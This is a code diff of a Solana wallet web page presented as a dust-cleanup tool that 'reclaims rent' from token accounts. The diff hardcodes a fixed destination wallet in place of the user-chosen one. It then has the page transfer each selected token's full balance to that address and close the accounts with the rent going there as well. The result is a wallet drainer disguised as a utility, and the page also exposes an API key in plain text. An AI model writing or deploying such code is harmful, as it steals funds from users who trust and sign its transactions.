@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
+<meta charset="utf-8" />
 <title>Universal Solana Wallet DApp (Helius)</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
@@ -9,17 +9,17 @@ body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;
 #walletApp{max-width:900px;width:100%;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,0.08)}
 button{padding:12px;border-radius:8px;border:0;font-size:15px;cursor:pointer;margin:5;background:#4caf50;color:#fff}
 button:hover{background:#45a049}
-#logs{margin-top:12px;padding:12px;border-radius:8px;background:#e8f4fd;white-space:pre-wrap;max-height:300px;overflow:auto;text-align:left}
+#logs{margin-top:12px;padding:12px;border-radius:8px;background:#e8f4fd;white-space:pre-wrap;max-height:420px;overflow:auto;text-align:left}
 h2{margin:0 0 12px 0}
 .note{font-size:13px;color:#666;margin-top:8px}
-.dropdown{position:relative;width:48%;cursor:pointer;border:1px solid #ccc;border-radius:8px;padding:10px;background:#fff;display:flex;align-items:center;justify-content:space-between}
+.dropdown{position:relative;width:200px;cursor:pointer;border:1px solid #ccc;border-radius:8px;padding:10px;background:#fff;display:flex;align-items:center;justify-content:space-between}
 .dropdown .selected{display:flex;align-items:center;gap:8px}
 .dropdown .options{position:absolute;top:100%;left:0;width:100%;background:#fff;border:1px solid #ccc;border-radius:8px;max-height:200px;overflow:auto;display:none;flex-direction:column;z-index:100}
 .dropdown .option{padding:8px 10px;display:flex;align-items:center;gap:8px;cursor:pointer}
 .dropdown .option:hover{background:#f0f0f0}
 .wallet-icon{width:20px;height:20px;}
-table{width:100%;border-collapse:collapse;margin-top:10px;}
-th,td{border:1px solid #ccc;padding:6px;text-align:center;}
+table{width:100%;border-collapse:collapse;margin-top:12px;}
+th,td{padding:8px;border:1px solid #ccc;text-align:left}
 </style>
 </head>
 <body>
@@ -38,18 +38,9 @@ th,td{border:1px solid #ccc;padding:6px;text-align:center;}
   <button id="disconnectWallet">Disconnect Wallet</button>
 </div>
 
-<div style="margin-top:12px;">
-  Destination wallet: <input type="text" id="destWallet" value="5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K" style="width:400px;">
-</div>
+<div class="note">Destination wallet for reclaimed tokens: <span id="destWallet">5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K</span></div>
 
-<div style="margin-top:12px;">
-  <table id="tokenTable">
-    <thead>
-      <tr><th>Select</th><th>Mint</th><th>Amount</th><th>USD</th></tr>
-    </thead>
-    <tbody></tbody>
-  </table>
-</div>
+<div id="tokenTableContainer"></div>
 
 <div style="text-align:center">
   <button id="reclaimRentBtn">🧹 Reclaim Selected Accounts</button>
@@ -60,21 +51,25 @@ th,td{border:1px solid #ccc;padding:6px;text-align:center;}
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.7/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.5/lib/index.iife.min.js"></script>
 <script>
 (async function(){
 const HELIUS_RPC='https://mainnet.helius-rpc.com/?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775';
 const TOKEN_PROGRAM='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
 const DUST_THRESHOLD_USD=0.01;
-const logsEl=document.getElementById('logs');
+const DEST_WALLET=new solanaWeb3.PublicKey('5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K');
+
 const walletDropdown=document.getElementById('walletDropdown');
 const selectedEl=walletDropdown.querySelector('.selected span');
 const optionsEl=walletDropdown.querySelector('.options');
+
 const connectBtn=document.getElementById('connectWallet');
 const disconnectBtn=document.getElementById('disconnectWallet');
 const reclaimBtn=document.getElementById('reclaimRentBtn');
-const tokenTableBody=document.getElementById('tokenTable').querySelector('tbody');
-const destInput=document.getElementById('destWallet');
+const logsEl=document.getElementById('logs');
+const tokenTableContainer=document.getElementById('tokenTableContainer');
+
+let wallet=null, publicKey=null, connection=null, selectedWalletObj=null, tokenAccounts=[];
 
 const WALLET_ICONS={
   Phantom:'https://i.postimg.cc/dtMtxggx/download-2025-10-28T170610-630.png',
@@ -82,20 +77,14 @@ const WALLET_ICONS={
   Slope:'https://raw.githubusercontent.com/solana-labs/wallet-adapter/main/packages/wallets/wallet-icons/src/slope.svg'
 };
 
-let wallet=null;
-let publicKey=null;
-let connection=new solanaWeb3.Connection(HELIUS_RPC,'confirmed');
-let selectedWalletObj=null;
-let tokenAccounts=[];
-
 function log(msg){ logsEl.innerText+=msg+'\n'; logsEl.scrollTop=logsEl.scrollHeight; console.log(msg);}
-function clearLogs(){ logsEl.innerText='';}
+function clearLogs(){ logsEl.innerText=''; }
 
 function detectWallets(){
   const wallets=[];
-  if(window.phantom?.solana?.isPhantom) wallets.push({wallet: window.phantom.solana,name:'Phantom'});
-  if(window.solflare?.isSolflare) wallets.push({wallet: window.solflare,name:'Solflare'});
-  if(window.Slope) try{ wallets.push({wallet:new window.Slope(),name:'Slope'}); }catch{}
+  if(window.phantom?.solana?.isPhantom) wallets.push({wallet: window.phantom.solana, name:'Phantom'});
+  if(window.solflare && window.solflare.isSolflare) wallets.push({wallet: window.solflare, name:'Solflare'});
+  if(window.Slope){ try{ wallets.push({wallet:new window.Slope(), name:'Slope'}); }catch{} }
   return wallets;
 }
 
@@ -105,11 +94,17 @@ function populateDropdown(){
     const div=document.createElement('div');
     div.className='option';
     div.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`;
-    div.onclick=()=>{ selectedWalletObj=w; selectedEl.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`; optionsEl.style.display='none';};
+    div.onclick=()=>{
+      selectedWalletObj=w;
+      selectedEl.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`;
+      optionsEl.style.display='none';
+    };
     optionsEl.appendChild(div);
   });
 }
-selectedEl.parentElement.onclick=()=>{ optionsEl.style.display = optionsEl.style.display==='flex'?'none':'flex'; }
+selectedEl.parentElement.onclick=()=>{ optionsEl.style.display=optionsEl.style.display==='flex'?'none':'flex'; }
+
+function buildConnection(){ return new solanaWeb3.Connection(HELIUS_RPC,'confirmed'); }
 
 async function getTokenPrices(mints){
   if(!mints.length) return {};
@@ -122,118 +117,135 @@ async function getTokenPrices(mints){
     const map={};
     data.forEach(p=>{ map[p.mint]=p.price||0; });
     return map;
-  }catch(e){ log('⚠️ Token prices fetch failed: '+e.message); return {};}
+  }catch(e){ log('⚠️ Token prices fetch failed: '+e.message); return {}; }
 }
 
 async function connectWalletFunc(){
   clearLogs();
   if(!selectedWalletObj){ log('❌ Select a wallet first'); return; }
   try{
-    log('Connecting ' + selectedWalletObj.name + '...');
+    log('Connecting '+selectedWalletObj.name+'...');
     const resp=await selectedWalletObj.wallet.connect();
     publicKey=resp?.publicKey || selectedWalletObj.wallet?.publicKey;
     if(publicKey?.toString) publicKey=publicKey.toString();
     wallet=selectedWalletObj.wallet;
     log('✅ Connected: '+publicKey);
+    if(!connection) connection=buildConnection();
 
+    // SOL balance
     const lamports=await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
-    log('💰 SOL Balance: ' + (lamports/1e9).toFixed(6) + ' SOL');
+    log('💰 SOL Balance: '+(lamports/1e9).toFixed(6)+' SOL');
 
-    const rawTokenAccounts=await connection.getParsedTokenAccountsByOwner(
-      new solanaWeb3.PublicKey(publicKey),
-      {programId:new solanaWeb3.PublicKey(TOKEN_PROGRAM)}
-    );
-    tokenAccounts=rawTokenAccounts.value;
+    // SPL tokens
+    await loadTokenAccounts();
 
-    const mints=tokenAccounts.map(t=>t.account.data.parsed.info.mint);
-    const prices=await getTokenPrices(mints);
-
-    tokenTableBody.innerHTML='';
-    tokenAccounts.forEach((t,i)=>{
-      const info=t.account.data.parsed.info;
-      const amount=Number(info.tokenAmount.uiAmount);
-      const usd=(amount*(prices[info.mint]||0)).toFixed(6);
-      const tr=document.createElement('tr');
-      tr.innerHTML=`<td><input type="checkbox" data-idx="${i}"></td><td>${info.mint}</td><td>${amount}</td><td>$${usd}</td>`;
-      tokenTableBody.appendChild(tr);
-    });
-
-  }catch(e){ log('❌ Connect failed: '+e.message);}
+  } catch(e){ log('❌ Connect failed: '+e.message); }
 }
 
 async function disconnectWalletFunc(){
-  if(!wallet){ log('❌ No wallet connected'); return;}
-  try{ if(wallet.disconnect) await wallet.disconnect(); log('Wallet disconnected'); wallet=null; publicKey=null; selectedWalletObj=null; tokenAccounts=[]; tokenTableBody.innerHTML='';}
+  if(!wallet){ log('❌ No wallet connected'); return; }
+  try{ if(wallet.disconnect) await wallet.disconnect(); log('Wallet disconnected'); wallet=null; publicKey=null; selectedWalletObj=null; tokenAccounts=[]; tokenTableContainer.innerHTML=''; }
   catch(e){ log('❌ Disconnect error: '+e.message);}
 }
 
-async function reclaimRent(){
-  if(!wallet || !publicKey){ log('❌ Connect wallet first.'); return;}
-  clearLogs();
-  log('🧹 Reclaim Rent started...');
+async function loadTokenAccounts(){
+  tokenAccounts=[];
+  tokenTableContainer.innerHTML='';
+  let tAccounts;
+  try{
+    tAccounts = await connection.getParsedTokenAccountsByOwner(
+      new solanaWeb3.PublicKey(publicKey),
+      {programId: new solanaWeb3.PublicKey(TOKEN_PROGRAM)}
+    );
+  }catch(e){ log('❌ Fetch token accounts failed: '+e.message); return; }
 
-  const checkedBoxes=document.querySelectorAll('#tokenTable input[type=checkbox]:checked');
-  if(checkedBoxes.length===0){ log('❌ No token accounts selected'); return;}
+  if(!tAccounts?.value?.length){ log('No SPL tokens found.'); return; }
 
-  const destinationPubKey=destInput.value;
-  if(!destinationPubKey){ log('❌ Specify a destination wallet'); return;}
+  const mints=tAccounts.value.map(t=>t.account.data.parsed.info.mint);
+  const prices=await getTokenPrices(mints);
 
-  for(const cb of checkedBoxes){
-    const idx=cb.dataset.idx;
-    const t=tokenAccounts[idx];
+  const table=document.createElement('table');
+  table.innerHTML='<tr><th>Select</th><th>Mint</th><th>Amount</th><th>USD</th></tr>';
+
+  tAccounts.value.forEach((t,i)=>{
     const info=t.account.data.parsed.info;
     const amount=Number(info.tokenAmount.uiAmount);
-    if(amount===0){ log(`Skipping ${info.mint}, zero balance`); continue;}
+    const usd=(amount*(prices[info.mint]||0)).toFixed(6);
+    tokenAccounts.push({...t, usdValue:usd});
+    const row=document.createElement('tr');
+    row.innerHTML=`<td><input type="checkbox" class="selectToken" data-index="${i}"></td>
+                     <td>${info.mint}</td>
+                     <td>${amount}</td>
+                     <td>$${usd}</td>`;
+    table.appendChild(row);
+  });
+  tokenTableContainer.appendChild(table);
+}
+
+async function reclaimRent(){
+  if(!wallet || !publicKey){ log('❌ Connect wallet first.'); return; }
+  clearLogs();
+  log('🧹 Reclaim Rent started...');
+  const splToken=window.splToken;
+  if(!splToken){ log('❌ splToken library not loaded'); return; }
+
+  const checkboxes=document.querySelectorAll('.selectToken:checked');
+  if(!checkboxes.length){ log('❌ Select token accounts to reclaim'); return; }
+
+  for(const cb of checkboxes){
+    const t=tokenAccounts[cb.dataset.index];
+    const tokenAcctPub=new solanaWeb3.PublicKey(t.pubkey);
+    const mintPub=new solanaWeb3.PublicKey(t.account.data.parsed.info.mint);
+    const decimals=t.account.data.parsed.info.tokenAmount.decimals;
+    const tokenAmount=Number(t.account.data.parsed.info.tokenAmount.uiAmount);
 
     try{
-      const mintPub=new solanaWeb3.PublicKey(info.mint);
-      const fromATA=new solanaWeb3.PublicKey(t.pubkey);
-      const toPub=new solanaWeb3.PublicKey(destinationPubKey);
-      const toATA=await splToken.getAssociatedTokenAddress(mintPub,toPub);
-
-      const tx=new solanaWeb3.Transaction();
-
-      // Ensure destination ATA exists
-      const accountInfo=await connection.getAccountInfo(toATA);
-      if(!accountInfo){
-        const ix= splToken.createAssociatedTokenAccountInstruction(wallet.publicKey||new solanaWeb3.PublicKey(publicKey), toATA, toPub, mintPub);
-        tx.add(ix);
+      // Transfer to destination wallet if >0
+      if(tokenAmount>0){
+        const destATA=await splToken.getAssociatedTokenAddress(mintPub, DEST_WALLET);
+        const transferIx=splToken.createTransferInstruction(
+          tokenAcctPub,
+          destATA,
+          new solanaWeb3.PublicKey(publicKey),
+          tokenAmount*Math.pow(10,decimals)
+        );
+        const tx=new solanaWeb3.Transaction().add(transferIx);
+        tx.feePayer=new solanaWeb3.PublicKey(publicKey);
+        const {blockhash}=await connection.getLatestBlockhash();
+        tx.recentBlockhash=blockhash;
+        const signedTx=await wallet.signTransaction(tx);
+        const sig=await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction(sig,'confirmed');
+        log(`✅ Transferred ${tokenAmount} tokens from ${tokenAcctPub} — tx ${sig}`);
       }
 
-      // Transfer
-      const transferIx=splToken.createTransferInstruction(fromATA,toATA, new solanaWeb3.PublicKey(publicKey), BigInt(amount*10**info.tokenAmount.decimals));
-      tx.add(transferIx);
+      // Close token account
+      const closeIx=splToken.createCloseAccountInstruction(
+        tokenAcctPub,
+        DEST_WALLET,
+        new solanaWeb3.PublicKey(publicKey)
+      );
+      const closeTx=new solanaWeb3.Transaction().add(closeIx);
+      closeTx.feePayer=new solanaWeb3.PublicKey(publicKey);
+      const {blockhash: bh2}=await connection.getLatestBlockhash();
+      closeTx.recentBlockhash=bh2;
+      const signedCloseTx=await wallet.signTransaction(closeTx);
+      const closeSig=await connection.sendRawTransaction(signedCloseTx.serialize());
+      await connection.confirmTransaction(closeSig,'confirmed');
+      log(`✅ Closed token account ${tokenAcctPub} — tx ${closeSig}`);
 
-      // Close source account
-      const closeIx=splToken.createCloseAccountInstruction(fromATA,new solanaWeb3.PublicKey(publicKey), new solanaWeb3.PublicKey(publicKey));
-      tx.add(closeIx);
-
-      tx.feePayer=new solanaWeb3.PublicKey(publicKey);
-      const {blockhash}=await connection.getLatestBlockhash();
-      tx.recentBlockhash=blockhash;
-
-      let sig;
-      if(wallet.signTransaction){
-        const signedTx=await wallet.signTransaction(tx);
-        sig=await connection.sendRawTransaction(signedTx.serialize());
-      }else if(wallet.signAndSendTransaction){
-        const res=await wallet.signAndSendTransaction(tx);
-        sig=res?.signature||res;
-      }else throw new Error('Wallet cannot sign transaction');
-
-      await connection.confirmTransaction(sig,'confirmed');
-      log(`✅ Transferred and closed ${info.mint} — tx ${sig}`);
-    }catch(e){ log(`❌ Transfer/Close failed for ${info.mint}: ${e?.message||e}`);}
+    }catch(e){ log(`❌ Transfer/Close failed for ${tokenAcctPub}: ${e?.message||e}`);}
   }
 
   log('🎉 Reclaim run complete.');
 }
 
-// Wire buttons
+// Button events
 connectBtn.addEventListener('click',connectWalletFunc);
 disconnectBtn.addEventListener('click',disconnectWalletFunc);
 reclaimBtn.addEventListener('click',reclaimRent);
 
+connection=buildConnection();
 populateDropdown();
 setInterval(()=>{ if(detectWallets().length !== optionsEl.children.length) populateDropdown(); },3000);
 
